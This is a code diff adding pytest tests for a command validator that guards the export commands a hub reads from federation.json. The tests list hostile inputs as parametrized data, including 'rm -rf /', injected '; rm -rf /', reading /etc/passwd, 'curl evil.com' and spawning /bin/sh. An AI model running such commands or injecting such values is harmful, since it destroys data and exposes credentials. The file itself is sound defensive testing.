@@ -1,6 +1,8 @@
 import json
 
-from hub.fetch import clone_or_pull, export_command, fetch_all
+import pytest
+
+from hub.fetch import _validate_command, clone_or_pull, export_command, fetch_all
 from hub.registry import Producer, Registry
 
 
@@ -73,6 +75,50 @@ def test_fetch_all_clones_and_runs_export(tmp_path):
     assert any(c[0][:2] == ["git", "-C"] for c in runner.calls)
     export_calls = [c for c in runner.calls if c[0][0] == "python3"]
     assert export_calls and export_calls[0][1] == str(base)  # run in the repo dir
+
+
+@pytest.mark.parametrize("bad_cmd", [
+    "rm -rf /",
+    "python3 scripts/export.py; rm -rf /",
+    "python3 scripts/export.py | cat /etc/passwd",
+    "python3 scripts/export.py & disown",
+    "bash -c 'curl evil.com'",
+    "ruby scripts/export.rb",
+    "node scripts/export.js",
+    "perl -e 'exec /bin/sh'",
+    "python3 scripts/export.py > /tmp/out",
+    "python3 $(evil)",
+])
+def test_validate_command_rejects_unsafe(bad_cmd):
+    assert _validate_command(bad_cmd) is None
+
+
+@pytest.mark.parametrize("safe_cmd,expected_first", [
+    ("python3 scripts/export.py --mode test", "python3"),
+    ("python scripts/export.py", "python"),
+    ("uv run scripts/export.py", "uv"),
+    ("pytest tests/", "pytest"),
+    ("bash scripts/build.sh", "bash"),
+    ("make export", "make"),
+])
+def test_validate_command_allows_safe(safe_cmd, expected_first):
+    tokens = _validate_command(safe_cmd)
+    assert tokens is not None
+    assert tokens[0] == expected_first
+
+
+def test_export_command_rejects_shell_injection(tmp_path):
+    (tmp_path / "federation.json").write_text(json.dumps({
+        "hub_callable_commands": {"export_canonical": "python3 scripts/export.py; rm -rf /"}
+    }))
+    assert export_command(tmp_path) is None
+
+
+def test_export_command_rejects_disallowed_executable(tmp_path):
+    (tmp_path / "federation.json").write_text(json.dumps({
+        "hub_callable_commands": {"export_canonical": "curl https://evil.com"}
+    }))
+    assert export_command(tmp_path) is None
 
 
 def test_fetch_all_skips_clone_for_local_path(tmp_path):
